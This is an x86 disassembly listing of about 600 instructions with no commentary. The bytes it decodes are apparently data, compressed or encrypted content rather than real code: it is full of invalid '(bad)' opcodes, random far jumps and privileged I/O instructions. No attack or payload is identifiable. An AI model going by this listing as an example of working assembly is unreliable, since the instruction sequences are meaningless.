  43758a:	or     al,0x26
  43758c:	hlt    
  43758d:	cli    
  43758e:	mov    bh,0xd6
  437590:	mov    ch,0xd3
  437592:	sub    esp,ebx
  437594:	xchg   ecx,eax
  437595:	aad    0x40
  437597:	inc    ebp
  437598:	xor    BYTE PTR [edi+ebx*1-0x7f],al
  43759c:	push   ebp
  43759d:	in     eax,dx
  43759e:	adc    BYTE PTR [edx+0x27],al
  4375a1:	int3   
  4375a2:	jmp    0x95c5:0xe466ee6a
  4375a9:	test   BYTE PTR [edx+0x2e867254],al
  4375af:	call   0x45b13742
  4375b4:	inc    ebx
  4375b5:	fist   WORD PTR [eax-0x5b]
  4375b8:	jo     0x437542
  4375ba:	sbb    edx,DWORD PTR [edx-0x25]
  4375bd:	add    BYTE PTR [edx],cl
  4375bf:	rcr    BYTE PTR [ebx+0x3b5a2a1a],cl
  4375c5:	mov    es,WORD PTR [esi]
  4375c7:	loop   0x437568
  4375c9:	bound  esp,QWORD PTR [ebp+0x2e]
  4375cc:	xlat   BYTE PTR ds:[ebx]
  4375cd:	mov    ch,BYTE PTR [eax+0x1e54d002]
  4375d3:	loop   0x4375ec
  4375d5:	ror    cl,0x3b
  4375d8:	mov    ds:0x7dc48b5e,al
  4375dd:	pop    edx
  4375de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4375df:	pop    es
  4375e0:	jo     0x437582
  4375e2:	fld    DWORD PTR [edi]
  4375e4:	popa   
  4375e5:	cmp    al,BYTE PTR [ecx-0x51de7b8]
  4375eb:	adc    BYTE PTR [edi+ecx*2+0x11],ch
  4375ef:	dec    ebp
  4375f0:	in     eax,dx
  4375f1:	fsubr  DWORD PTR [edi+0x7c]
  4375f4:	test   eax,0x1410579a
  4375f9:	adc    eax,0x89a8d854
  4375fe:	cs add al,0xe3
  437601:	pop    edx
  437602:	sahf   
  437603:	in     al,dx
  437604:	sub    al,0x30
  437606:	push   ebx
  437607:	push   esi
  437608:	and    DWORD PTR [eax],esp
  43760a:	loope  0x437610
  43760c:	cs pusha 
  43760e:	enter  0x286c,0x5a
  437612:	push   edi
  437613:	loopne 0x437628
  437615:	loopne 0x437625
  437617:	add    ebp,DWORD PTR [edx-0x40]
  43761a:	jo     0x4375ca
  43761c:	cmp    al,0x6f
  43761e:	bound  edx,QWORD PTR [ecx-0x79]
  437621:	mov    al,0x8d
  437623:	xor    eax,0x78748074
  437628:	or     bl,BYTE PTR [edx+0x5]
  43762b:	mov    al,ds:0x4023b426
  437630:	and    eax,0x5413942a
  437635:	sub    eax,0xfa6c22c0
  43763a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43763b:	add    bh,dl
  43763d:	dec    ebp
  43763e:	jmp    0x6f0011ef
  437643:	scas   eax,DWORD PTR es:[edi]
  437644:	or     ah,bh
  437646:	xchg   edi,eax
  437647:	lock mov WORD PTR [ebx+0x61cd54f8],es
  43764e:	add    BYTE PTR [ebp-0x6f2ae787],bl
  437654:	jle    0x437634
  437656:	jbe    0x4375f8
  437658:	add    BYTE PTR [ecx-0x4cffbabc],ch
  43765e:	stos   DWORD PTR es:[edi],eax
  43765f:	cmp    eax,0xb8d02ea0
  437664:	xchg   BYTE PTR [ebx+0x3576a862],cl
  43766a:	cmp    BYTE PTR [eax+0x7874879e],bl
  437670:	sti    
  437671:	adc    al,BYTE PTR [edi+0x4221aa34]
  437677:	jae    0x43766b
  437679:	add    al,0x84
  43767b:	sar    BYTE PTR [ebp+ebp*2+0x7040ddf4],1
  437682:	add    BYTE PTR gs:[edx],al
  437685:	fst    QWORD PTR ds:[ebx+0x33]
  437689:	or     BYTE PTR [eax+0x400a0322],bh
  43768f:	popa   
  437690:	jbe    0x43770a
  437692:	add    BYTE PTR [ecx+0x5418906a],ah
  437698:	call   0x136b8f53
  43769d:	mov    ebp,0xa444033e
  4376a2:	ret    0x4863
  4376a5:	add    dl,BYTE PTR [ebx]
  4376a7:	sbb    eax,0xcbbae422
  4376ac:	fs mov cl,0x35
  4376af:	or     eax,0xdaf02405
  4376b4:	pop    edx
  4376b5:	mov    al,0x1c
  4376b7:	adc    ecx,ebx
  4376b9:	add    ebp,edi
  4376bb:	mov    ah,0x54
  4376bd:	(bad)  
  4376be:	stos   BYTE PTR es:[edi],al
  4376bf:	repnz (bad) 
  4376c1:	ins    DWORD PTR es:[edi],dx
  4376c2:	(bad)  
  4376c3:	or     cl,BYTE PTR [edx+0x7aa0c88e]
  4376c9:	aas    
  4376ca:	push   ds
  4376cb:	push   ebx
  4376cc:	add    al,0x90
  4376ce:	adc    al,cl
  4376d0:	mov    edx,0x871bc128
  4376d5:	cmp    al,0x76
  4376d7:	divps  xmm0,xmm1
  4376da:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4376db:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4376dc:	xor    bl,BYTE PTR es:[esi-0x38]
  4376e0:	mov    ds:0x607a01a2,al
  4376e5:	imul   edi,DWORD PTR [ebp+esi*4-0x20],0xffffffd7
  4376ea:	(bad)  
  4376eb:	sub    eax,0xe21ec315
  4376f0:	in     al,0xef
  4376f2:	xor    al,0x2c
  4376f4:	in     eax,0xc3
  4376f6:	pop    es
  4376f7:	pop    ecx
  4376f8:	lahf   
  4376f9:	and    al,0xd
  4376fb:	pop    ds
  4376fc:	pushf  
  4376fd:	(bad)  
  4376fe:	cld    
  4376ff:	pop    esp
  437700:	mov    cl,0xe9
  437702:	adc    BYTE PTR [edx-0x7e],0x6
  437706:	rol    BYTE PTR [ebx+edi*4],0x7e
  43770a:	test   BYTE PTR ds:0xc91487e0,0x41
  437711:	into   
  437712:	shr    eax,1
  437714:	lea    edx,[esi]
  437716:	xchg   dl,al
  437718:	push   eax
  437719:	sub    eax,ecx
  43771b:	mov    al,0xa
  43771d:	lods   al,BYTE PTR cs:[esi]
  43771f:	add    cl,BYTE PTR [eax+0x6a]
  437722:	enter  0x3a50,0x51
  437726:	pusha  
  437727:	push   ebp
  437728:	mov    dl,0xca
  43772a:	xchg   edi,eax
  43772b:	mov    esi,0x581e5730
  437730:	test   al,0x80
  437732:	or     bh,dl
  437734:	ds and eax,0x9f05459d
  43773a:	es clc 
  43773c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43773d:	or     al,0x5e
  43773f:	ds adc eax,0x174178c
  437745:	xor    al,0xa3
  437747:	inc    edx
  437748:	aad    0x0
  43774a:	xchg   ebx,eax
  43774b:	pop    eax
  43774c:	test   eax,0xccf18100
  437751:	nop
  437752:	ficom  DWORD PTR [edx+0x54356999]
  437758:	test   al,0xbe
  43775a:	sbb    bl,BYTE PTR [edi+0x6e]
  43775d:	or     al,dl
  43775f:	push   ebp
  437760:	or     BYTE PTR [esi+ecx*4],ch
  437763:	adc    al,0x46
  437765:	(bad)  
  437766:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  437767:	rdmsr  
  437769:	jbe    0x4377ad
  43776b:	push   ss
  43776c:	push   esp
  43776d:	call   0x27e89e6e
  437772:	push   ecx
  437773:	(bad)  
  437774:	pop    edx
  437775:	je     0x437761
  437777:	push   ds
  437778:	dec    eax
  437779:	lods   eax,DWORD PTR ds:[esi]
  43777a:	sub    DWORD PTR ds:0xfa54dca9,ebp
  437780:	push   eax
  437781:	xchg   esp,eax
  437782:	mov    BYTE PTR [ecx],0x6c
  437785:	outs   dx,BYTE PTR ds:[esi]
  437786:	add    eax,DWORD PTR [edx+0x64]
  437789:	sti    
  43778a:	fadd   DWORD PTR [ebx]
  43778c:	add    DWORD PTR [eax-0x41],ebp
  43778f:	cld    
  437790:	mov    eax,ds:0x1eb2b239
  437795:	push   esp
  437796:	sbb    BYTE PTR [ebp-0x2c21487e],cl
  43779c:	je     0x43777a
  43779e:	(bad)  
  43779f:	push   esi
  4377a0:	cdq    
  4377a1:	sub    al,0x15
  4377a3:	adc    ah,BYTE PTR [ebx-0x44]
  4377a6:	test   BYTE PTR [ecx],bh
  4377a8:	inc    eax
  4377a9:	push   ebx
  4377aa:	imul   eax,DWORD PTR [edi-0x4a],0xffffffee
  4377ae:	aad    0x76
  4377b0:	xor    eax,0x36407070
  4377b5:	fld    DWORD PTR [edi]
  4377b7:	pusha  
  4377b8:	xchg   edx,eax
  4377b9:	gs call 0x824d7a89
  4377bf:	xchg   ecx,eax
  4377c0:	rcl    DWORD PTR [ebx+ebx*2],0x9f
  4377c4:	push   es
  4377c5:	jbe    0x437755
  4377c7:	inc    esi
  4377c8:	push   ds
  4377c9:	pop    es
  4377ca:	add    ebp,DWORD PTR [edi-0x5c2a9ffb]
  4377d0:	ficomp DWORD PTR [edx-0xd53c7fe]
  4377d6:	mov    dl,0xe2
  4377d8:	test   ecx,0xa362180
  4377de:	pushf  
  4377df:	scas   eax,DWORD PTR es:[edi]
  4377e0:	cmp    BYTE PTR [ecx+0x0],dl
  4377e3:	cdq    
  4377e4:	mov    gs,WORD PTR [eax-0x60]
  4377e7:	(bad)  
  4377e8:	pusha  
  4377e9:	mov    dh,0xdc
  4377eb:	cmp    al,BYTE PTR [eax]
  4377ed:	adc    BYTE PTR [edx],al
  4377ef:	adc    ah,BYTE PTR [edi]
  4377f1:	pusha  
  4377f2:	add    ah,ch
  4377f4:	mov    BYTE PTR [esi+0x12],bl
  4377f7:	inc    ebp
  4377f8:	std    
  4377f9:	mov    dl,0x5a
  4377fb:	cs pop esi
  4377fd:	mov    ch,0xf0
  4377ff:	dec    ecx
  437800:	sbb    al,0x5a
  437802:	cmp    ecx,DWORD PTR [edx]
  437804:	cs pop esi
  437806:	or     al,dh
  437808:	jmp    0x4377ac
  43780a:	mov    esp,0xc0d2f4f3
  43780f:	or     ecx,DWORD PTR [edx]
  437811:	push   cs
  437812:	adc    al,bh
  437814:	fdivr  DWORD PTR [edx]
  437816:	sub    BYTE PTR [eax],ch
  437818:	mov    edx,0x84c1634
  43781d:	shl    BYTE PTR [edx+0x61624645],0x2c
  437824:	sub    al,0x90
  437826:	mov    esi,0xbad69ca2
  43782b:	lods   al,BYTE PTR ds:[esi]
  43782c:	adc    BYTE PTR [eax-0x6a],0x92
  437830:	test   BYTE PTR [edx+0x1c],al
  437833:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  437834:	inc    eax
  437835:	imul   eax,ecx,0x320ca531
  43783b:	cmp    al,0xc0
  43783d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43783e:	dec    ecx
  43783f:	fisubr DWORD PTR ss:[edx-0x33ab93f1]
  437846:	call   0x1acf830e
  43784b:	cmc    
  43784c:	or     ebp,edi
  43784e:	bound  edx,QWORD PTR ds:0x426ec8dc
  437854:	xor    eax,0xad495db
  437859:	mov    ah,0x5a
  43785b:	mov    cs,WORD PTR [ecx-0x43d1b8d6]
  437861:	lock lods eax,DWORD PTR ds:[esi]
  437863:	push   esi
  437864:	sbb    al,0x59
  437866:	pushf  
  437867:	pop    es
  437868:	jo     0x437856
  43786a:	int    0x73
  43786c:	ss xchg ecx,eax
  43786e:	add    DWORD PTR [edx+0x50],0xa20246b2
  437875:	jno    0x4378a0
  437877:	loop   0x43787e
  437879:	jo     0x437825
  43787b:	inc    ecx
  43787c:	mov    dl,BYTE PTR [esi-0x1c]
  43787f:	test   al,0x10
  437881:	dec    edx
  437882:	xabort 0x84
  437885:	(bad)  
  437886:	mov    dh,BYTE PTR [esi-0x57]
  437889:	and    dl,BYTE PTR [edi-0x3751335b]
  43788f:	cmp    eax,0x8a9ad686
  437894:	and    dh,ch
  437896:	cli    
  437897:	push   eax
  437898:	pop    esi
  437899:	xor    BYTE PTR [esp+eax*2],0xda
  43789d:	push   esi
  43789e:	xor    esi,DWORD PTR [edx+esi*4-0x72]
  4378a2:	push   0x1c
  4378a4:	or     al,0x55
  4378a6:	or     DWORD PTR [ebx-0x4d],esp
  4378a9:	(bad)  
  4378aa:	xchg   esp,eax
  4378ab:	sbb    esp,DWORD PTR [edi-0x5a89cbc6]
  4378b1:	cmp    BYTE PTR [ebx-0x43fd8f28],dl
  4378b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4378b8:	dec    ecx
  4378b9:	mov    eax,0x37c049fa
  4378be:	or     ebp,DWORD PTR [edx-0x28]
  4378c1:	mov    cl,0x0
  4378c3:	and    ah,ah
  4378c5:	mov    DWORD PTR [ebx],esp
  4378c7:	mov    ah,0xed
  4378c9:	pop    edx
  4378ca:	aas    
  4378cb:	lods   al,BYTE PTR ds:[esi]
  4378cc:	and    BYTE PTR [ebx+0x5754b7fa],dl
  4378d2:	jmp    0xc368:0x34a07111
  4378d9:	pushf  
  4378da:	push   edx
  4378db:	dec    ebx
  4378dc:	int    0xbc
  4378de:	sub    bl,BYTE PTR [edi-0x5f5eaf00]
  4378e4:	jl     0x4378f0
  4378e6:	cwde   
  4378e7:	js     0x437931
  4378e9:	sub    eax,0x61dc9d4
  4378ee:	dec    edx
  4378ef:	jne    0x437936
  4378f1:	cmp    DWORD PTR [eax],eax
  4378f3:	cld    
  4378f4:	cmp    al,0x62
  4378f6:	test   BYTE PTR [eax],al
  4378f8:	mov    edx,0x28566a7e
  4378fd:	dec    ecx
  4378fe:	in     al,dx
  4378ff:	hlt    
  437900:	and    dl,dh
  437902:	dec    esp
  437903:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  437904:	loopne 0x43797e
  437906:	inc    esp
  437907:	sub    al,0x38
  437909:	jmp    DWORD PTR [esp+esi*2+0x285a3f88]
  437910:	pop    ecx
  437911:	stos   DWORD PTR es:[edi],eax
  437912:	pop    eax
  437913:	xor    BYTE PTR [esi-0x1a],bl
  437916:	call   0x3d13:0xc441d0fb
  43791d:	add    dl,BYTE PTR [ebp+0x76]
  437920:	(bad)  
  437921:	in     al,dx
  437922:	ins    BYTE PTR es:[edi],dx
  437923:	or     BYTE PTR [esi+edx*1+0x6204f800],cl
  43792a:	(bad)  
  43792b:	out    dx,al
  43792c:	push   eax
  43792d:	call   0xb043:0xd2870a26
  437934:	sar    BYTE PTR [edi+0x554b3aee],cl
  43793a:	scas   eax,DWORD PTR es:[edi]
  43793b:	adc    BYTE PTR [esp+edi*2+0x4d],bl
  43793f:	dec    ebx
  437940:	add    BYTE PTR [esi+ebx*1],dl
  437943:	inc    esp
  437944:	lods   al,BYTE PTR ds:[esi]
  437945:	push   ebp
  437946:	or     eax,0xa77a3842
  43794b:	div    BYTE PTR [esi]
  43794d:	cld    
  43794e:	push   es
  43794f:	push   ds
  437950:	jmp    0x437905
  437952:	ins    BYTE PTR es:[edi],dx
  437953:	inc    edi
  437954:	loop   0x4379d4
  437956:	les    edx,FWORD PTR [ecx+0x1fa58ed1]
  43795c:	add    BYTE PTR [ebp+0x7c721e3f],al
  437962:	out    0x64,al
  437964:	xchg   edx,eax
  437965:	fs and al,0x8c
  437968:	retf   0x36bb
  43796b:	pop    edx
  43796c:	xor    esi,DWORD PTR [eax+esi*4-0x6933d36c]
  437973:	dec    esp
  437974:	rol    BYTE PTR [edx+0x7de46243],1
  43797a:	(bad)  
  43797b:	sub    al,BYTE PTR es:[esi-0xbeb02e4]
  437982:	(bad)  
  437984:	shl    BYTE PTR [ecx],1
  437986:	loopne 0x43798c
  437988:	or     al,BYTE PTR [ecx]
  43798a:	pop    eax
  43798b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43798c:	test   BYTE PTR [esi-0x5e],al
  43798f:	enter  0x856,0x3a
  437993:	adc    al,0xb1
  437995:	sbb    eax,0x668e9d38
  43799a:	cmp    dl,0x2b
  43799d:	(bad)  
  43799f:	xor    eax,0xb055748a
  4379a4:	mov    eax,0x5580eadf
  4379a9:	popa   
  4379aa:	push   edx
  4379ab:	push   ss
  4379ac:	and    al,0xa4
  4379ae:	adc    al,0xd7
  4379b0:	xor    BYTE PTR [esi+0x1],bl
  4379b3:	dec    edx
  4379b4:	add    al,0xfc
  4379b6:	fmul   st(7),st
  4379b8:	sbb    BYTE PTR [esi],0x2d
  4379bb:	ins    BYTE PTR es:[edi],dx
  4379bc:	and    ah,BYTE PTR [eax+0x61c7bc11]
  4379c2:	fidivr DWORD PTR [edx]
  4379c4:	inc    esp
  4379c5:	nop
  4379c6:	fisubr WORD PTR [ebx-0x2a]
  4379c9:	ins    BYTE PTR es:[edi],dx
  4379ca:	neg    DWORD PTR [esi+0x0]
  4379cd:	xor    al,0x34
  4379cf:	and    eax,0x8eb8e02
  4379d4:	push   es
  4379d5:	push   edi
  4379d6:	es jbe 0x4379e1
  4379d9:	pop    edx
  4379da:	push   0xb976b971
  4379df:	mov    al,ds:0x8c0da92e
  4379e4:	mov    ah,0x44
  4379e6:	mov    ds,WORD PTR [eax]
  4379e8:	ins    BYTE PTR es:[edi],dx
  4379e9:	cmove  ebp,DWORD PTR [ebx]
  4379ec:	xor    dh,0x6a
  4379ef:	mov    cl,0xce
  4379f1:	cmp    DWORD PTR [esi+0x1f],ebx
  4379f4:	repz dec ebx
  4379f6:	inc    ebx
  4379f7:	das    
  4379f8:	or     BYTE PTR [edx+ebx*1-0x7b],dh
  4379fc:	push   ss
  4379fd:	and    BYTE PTR [ecx+edx*4],dh
  437a00:	mov    DWORD PTR [eax+0xc1b94de],edx
  437a06:	mov    esp,0x9e129a14
  437a0b:	mov    edx,0x2fd91eec
  437a10:	dec    eax
  437a11:	aas    
  437a12:	shl    BYTE PTR [esi],0xba
  437a15:	jmp    0x7626:0x78a61fa7
  437a1c:	adc    eax,0xa380f414
  437a21:	xchg   DWORD PTR [eax+0x35049ed8],ebx
  437a27:	lods   al,BYTE PTR ds:[esi]
  437a28:	push   0x5a
  437a2a:	pop    ss
  437a2b:	mov    esp,0x63353e7c
  437a30:	push   ebx
  437a31:	xchg   ebp,eax
  437a32:	and    BYTE PTR [esi],al
  437a34:	xor    eax,ebx
  437a36:	inc    ecx
  437a37:	dec    ecx
  437a38:	cdq    
  437a39:	test   al,0x79
  437a3b:	sbb    BYTE PTR [esp+edx*1-0x793b657],dl
  437a42:	mov    gs,edx
  437a44:	add    ch,BYTE PTR [ebx-0x76]
  437a47:	or     BYTE PTR [eax+eiz*1-0x45d0c9ba],bh
  437a4e:	ds dec eax
  437a50:	fdivr  DWORD PTR [eax-0x772d7313]
  437a56:	adc    al,0x26
  437a58:	push   ebp
  437a59:	addr16 push edx
  437a5b:	lock push 0x6be45b81
  437a61:	inc    ecx
  437a62:	imul   eax,DWORD PTR ds:0x5a6aaa06,0x28
  437a69:	mov    ?,WORD PTR [ecx+eax*2-0x3d84adbd]
  437a70:	add    esp,DWORD PTR [edx]
  437a72:	cmp    BYTE PTR [ebx+0x1aa63b7a],ah
  437a78:	pop    ds
  437a79:	sub    DWORD PTR [eax+esi*4-0x4d1fa1f9],edi
  437a80:	and    al,0x8a
  437a82:	aam    0x82
  437a84:	mov    ah,BYTE PTR [edi-0x1e]
  437a87:	add    cl,bh
  437a89:	push   eax
  437a8a:	add    cl,BYTE PTR [edi-0x56510306]
  437a90:	push   ds
  437a91:	adc    al,al
  437a93:	daa    
  437a94:	add    DWORD PTR [edx-0x23],ebx
  437a97:	push   edx
  437a98:	dec    eax
  437a99:	or     bl,BYTE PTR [ebx]
  437a9b:	inc    edx
  437a9c:	mov    al,ds:0xeefcbf8e
  437aa1:	inc    ecx
  437aa2:	inc    esp
  437aa3:	inc    ecx
  437aa4:	imul   esp,edx,0xffffffb7
  437aa7:	jbe    0x437a4e
  437aa9:	not    BYTE PTR [edx-0x52fef07a]
  437aaf:	stos   BYTE PTR es:[edi],al
  437ab0:	outs   dx,BYTE PTR ds:[esi]
  437ab1:	pop    esi
  437ab2:	push   esi
  437ab3:	je     0x437ad6
  437ab5:	mov    esp,0xd411e9b5
  437aba:	push   ss
  437abb:	push   ss
  437abc:	dec    eax
  437abd:	mov    eax,0xf1bf5bb8
  437ac2:	sub    DWORD PTR [ebp+0x36],edi
  437ac5:	into   
  437ac6:	hlt    
  437ac7:	ds inc esi
  437ac9:	mov    bh,0x30
  437acb:	icebp  
  437acc:	add    eax,ebx
  437ace:	inc    edx
  437acf:	pop    esi
  437ad0:	ds jl  0x437b12
  437ad3:	sub    al,0xbc
  437ad5:	or     DWORD PTR [eax+edi*8],ebp
  437ad8:	fs sar esp,1
  437adb:	adc    esp,DWORD PTR [edi]
  437add:	adc    ch,dl
  437adf:	ror    BYTE PTR [edx-0x5f6f07d3],1
  437ae5:	aas    
  437ae6:	es ja  0x437b5f
  437ae9:	cmp    al,0x19
  437aeb:	fadd   DWORD PTR [esi+0x17ca9265]
  437af1:	jb     0x437b72
  437af3:	test   DWORD PTR [esi],edx
  437af5:	pop    esp
  437af6:	mov    DWORD PTR [eax+0x7f],ebp
  437af9:	dec    eax
  437afa:	jle    0x437ad4
  437afc:	loope  0x437ac2
  437afe:	ins    DWORD PTR es:[edi],dx
  437aff:	mov    ch,0x7
  437b01:	adc    al,0x12
  437b03:	add    ebx,edi
  437b05:	jbe    0x437b62
  437b07:	sbb    ebp,ebp
  437b09:	xchg   ecx,eax
  437b0a:	cli    
  437b0b:	(bad)  
  437b0c:	repnz push esp
  437b0e:	out    0xd8,al
  437b10:	cmp    bh,BYTE PTR [esi]
  437b12:	or     esi,DWORD PTR [ebp+ecx*1-0x5edf2dda]
  437b19:	ss dec esp
  437b1b:	mov    ecx,0xb0542698
  437b20:	mov    ch,0x83
  437b22:	push   edx
  437b23:	xor    al,BYTE PTR [esi+0x22]
  437b26:	in     eax,0xb4
  437b28:	test   eax,0x782c48bf
  437b2d:	es jge 0x437b84
  437b30:	and    al,0xd1
  437b32:	call   0x127:0xc058f48e
  437b39:	mov    ds:0xad31fe81,al
  437b3e:	outs   dx,BYTE PTR ds:[esi]
  437b3f:	jmp    0x51c6:0x1f4a308c
  437b46:	pop    es
  437b47:	dec    ebx
  437b48:	jmp    0x3c5b:0x72881242
  437b4f:	or     bl,BYTE PTR [ebx-0x6d]
  437b52:	sub    ch,BYTE PTR [edx-0x40]
  437b55:	pop    esi
  437b56:	cs adc eax,0xcd125cf4
  437b5c:	or     al,BYTE PTR ds:0x52dcc166
  437b62:	jne    0x437b8d
  437b64:	test   al,0x42
  437b66:	outs   dx,BYTE PTR ds:[esi]
  437b67:	(bad)  
  437b68:	mov    eax,0x36ea5357
  437b6d:	hlt    
  437b6e:	out    0x8b,al
  437b70:	adc    al,0xa3
  437b72:	mov    dl,0xd0
  437b74:	or     cl,ch
  437b76:	call   0x70950fe5
  437b7b:	adc    dh,BYTE PTR [edx]
  437b7d:	std    
  437b7e:	jl     0x437b22
  437b80:	mov    ebx,0x6d42d046
  437b85:	sub    DWORD PTR [ebp-0x44],0x667007de
  437b8c:	lods   eax,DWORD PTR ds:[esi]
  437b8d:	mov    esi,0x14fbae5e
  437b92:	mov    cl,0xe0
  437b94:	inc    eax
  437b95:	rcr    BYTE PTR [esi],1
  437b97:	aas    
  437b98:	repz (bad) 
  437b9a:	(bad)  [esi]
  437b9c:	je     0x437bcb
  437b9e:	mov    al,ds:0x2dead68
  437ba3:	xchg   esi,eax
  437ba4:	or     al,0xef
  437ba6:	xchg   ecx,eax
  437ba7:	shr    BYTE PTR [edx],0x13
  437baa:	sub    al,0x84
  437bac:	shl    BYTE PTR ds:0xe02eb500,cl
  437bb2:	mov    dl,0xb9
  437bb4:	xor    al,0x9c
  437bb6:	push   edx
  437bb7:	sub    dl,BYTE PTR [ebp-0x39]
  437bba:	push   0x2f
  437bbc:	lock xchg edx,ecx
  437bbf:	inc    eax
  437bc0:	and    DWORD PTR [eax+edi*4],0xffffff90
  437bc4:	sub    ebp,DWORD PTR ds:0x5e006ab5
  437bca:	shl    DWORD PTR [esi+0x14a4dd9c],1
  437bd0:	mov    edi,0xf4a0e23a
  437bd5:	xor    BYTE PTR [edx+0x40],0xa5
  437bd9:	or     al,0x6b
  437bdb:	mov    ?,WORD PTR [ebx-0x3c]
  437bde:	inc    eax
  437bdf:	jge    0x437c5d
  437be1:	xor    al,0xf5
  437be3:	add    BYTE PTR [edx-0x58],al
  437be6:	cld    
  437be7:	fidivr WORD PTR [ebx]
  437be9:	jle    0x437c4e
  437beb:	sar    DWORD PTR [edi],cl
  437bed:	dec    ecx
  437bee:	pushf  
  437bef:	dec    ecx
  437bf0:	sbb    DWORD PTR [eax],eax
  437bf2:	adc    DWORD PTR [eax-0x64],eax
  437bf5:	add    DWORD PTR [edi],esp
  437bf7:	dec    edx
  437bf8:	jg     0x437c1e
  437bfa:	xor    al,0x23
  437bfc:	test   al,0x0
  437bfe:	xchg   esp,eax
  437bff:	push   es
  437c00:	ficomp WORD PTR [edx]
  437c02:	add    BYTE PTR [edi-0x29615b7c],ah
  437c08:	ret    0x822d
  437c0b:	je     0x437bc3
  437c0d:	mov    ds:0x7e8f0490,al
  437c12:	sbb    dl,BYTE PTR [ebp-0x6c]
  437c15:	mov    esi,0xf77eab08
  437c1a:	xchg   esi,eax
  437c1b:	arpl   WORD PTR ds:0xc064d036,di
  437c21:	lock retf 0xea7f
  437c25:	pop    ecx
  437c26:	push   eax
  437c27:	and    DWORD PTR [eax-0x2e89cb0b],eax
  437c2d:	mov    fs,WORD PTR [ecx+0x4c40fced]
  437c33:	ins    DWORD PTR es:[edi],dx
  437c34:	idiv   DWORD PTR [esi+0x433f1c73]
  437c3a:	add    eax,ebx
  437c3c:	aam    0xf6
  437c3e:	or     edi,DWORD PTR [esi+0xff4264e]
  437c44:	mov    al,ds:0xe4418eb6
  437c49:	(bad)  
  437c4a:	fsubr  st(6),st
  437c4c:	sub    BYTE PTR [esi],ah
  437c4e:	mov    bl,0x42
  437c50:	rol    DWORD PTR [ecx+0x665ead89],0x60
  437c57:	mov    es,eax
  437c59:	fisttp DWORD PTR ss:[esp+edx*8-0x3c]
  437c5e:	adc    al,0x12
  437c60:	sbb    al,0xca
  437c62:	sbb    al,0x9c
  437c64:	adc    BYTE PTR [edx-0x2a],bl
  437c67:	dec    ecx
  437c68:	mov    al,ds:0xcc9853f6
  437c6d:	call   0xe0a:0x42ac0eda
  437c74:	push   ss
  437c75:	mov    cl,0xa0
  437c77:	and    BYTE PTR [edx-0x4e],ch
  437c7a:	mov    al,0x5d
  437c7c:	or     esp,esi
  437c7e:	push   0x16
  437c80:	pop    esp
  437c81:	mov    dh,0x56
  437c83:	jnp    0x437ca6
  437c85:	mov    esp,0x3e4028b6
  437c8a:	stos   DWORD PTR es:[edi],eax
  437c8b:	or     ah,BYTE PTR [eax-0x3f3e5415]
  437c91:	ret    0x8ca8
  437c94:	or     DWORD PTR [eax+0x30],esi
  437c97:	rol    BYTE PTR [ecx-0x76],1
  437c9a:	call   0x5e4b:0x69fb2ac8
  437ca1:	jle    0x437cd7
  437ca3:	jno    0x437c87
  437ca5:	xchg   esi,eax
  437ca6:	mov    WORD PTR [esi],es
  437ca8:	xor    eax,0xb052caa8
  437cad:	cmp    BYTE PTR [eax+0x4807340e],ah
  437cb3:	add    al,0xde
  437cb5:	xor    al,0x63
  437cb7:	inc    eax
  437cb8:	inc    ebp
  437cb9:	ret    
  437cba:	adc    edi,DWORD PTR [esi+0x25]
  437cbd:	add    bh,BYTE PTR [edx+0x5560be82]
  437cc3:	push   ebx
  437cc4:	sbb    BYTE PTR [esp+ecx*2+0x29],bl
  437cc8:	and    al,0xb3
  437cca:	outs   dx,DWORD PTR ds:[esi]
  437ccb:	push   ecx
  437ccc:	call   0xa037bec9
  437cd1:	fsub   st,st(4)
  437cd3:	dec    esi
  437cd4:	cwde   
  437cd5:	adc    eax,0x9ab8ed45
  437cda:	cs sbb al,cl
  437cdd:	in     eax,0xac
  437cdf:	mov    ?,WORD PTR [eax+0x2540ea40]
  437ce5:	sub    BYTE PTR [eax],dh
  437ce7:	test   DWORD PTR [edx-0x6d],0x7400f68c
  437cee:	loop   0x437d3b
  437cf0:	fcom   DWORD PTR [ecx+0x71]
  437cf3:	fs popa 
  437cf5:	cmp    ebp,DWORD PTR [ecx+ecx*1-0x66]
  437cf9:	mov    esp,0xa2fdbefa
  437cfe:	xor    eax,0x2dbe36e8
  437d03:	ins    DWORD PTR es:[edi],dx
  437d04:	lds    ebx,FWORD PTR [esi-0x54]
  437d07:	jmp    0x353e:0x16a6c240
  437d0e:	xchg   ah,dh
  437d10:	or     edx,DWORD PTR [ecx+edx*8+0xd]
  437d14:	stos   DWORD PTR es:[edi],eax
  437d15:	pushf  
  437d16:	push   edx
  437d17:	bnd je 0x437ce4
  437d1a:	pop    edx
  437d1b:	mov    edi,0xf8a2bc20
  437d20:	add    cl,BYTE PTR [ecx+0x540b20d0]
  437d26:	jnp    0x437d4c
  437d28:	add    BYTE PTR [eax],bh
  437d2a:	sub    BYTE PTR [edx-0x66],0xaf
  437d2e:	cmp    al,BYTE PTR [eax]
  437d30:	hlt    
  437d31:	nop
  437d32:	mov    al,0x69
  437d34:	fidiv  DWORD PTR gs:[edx]
  437d37:	or     al,0x60
  437d39:	push   ebx
  437d3a:	push   eax
  437d3b:	fsub   DWORD PTR [esi+eax*8+0x77]
  437d3f:	pop    ds
  437d40:	mov    dl,0xb6
  437d42:	neg    dl
  437d44:	mov    DWORD PTR [ebx+edx*4-0x6c],ecx
  437d48:	sbb    dl,BYTE PTR [esi+0x30ba852]
  437d4e:	pop    ds
  437d4f:	add    DWORD PTR [eax-0x1746bd14],0xd921cd40
  437d59:	popa   
  437d5a:	push   esi
  437d5b:	xchg   esp,eax
  437d5c:	cld    
  437d5d:	push   edx
  437d5e:	test   al,0x14
  437d60:	jo     0x437dc3
  437d62:	mov    eax,ds:0x5184dea8
  437d67:	and    eax,esi
  437d69:	push   ebx
  437d6a:	call   0x22d65a47
  437d6f:	aad    0xc0
  437d71:	inc    edi
  437d72:	push   eax
  437d73:	(bad)
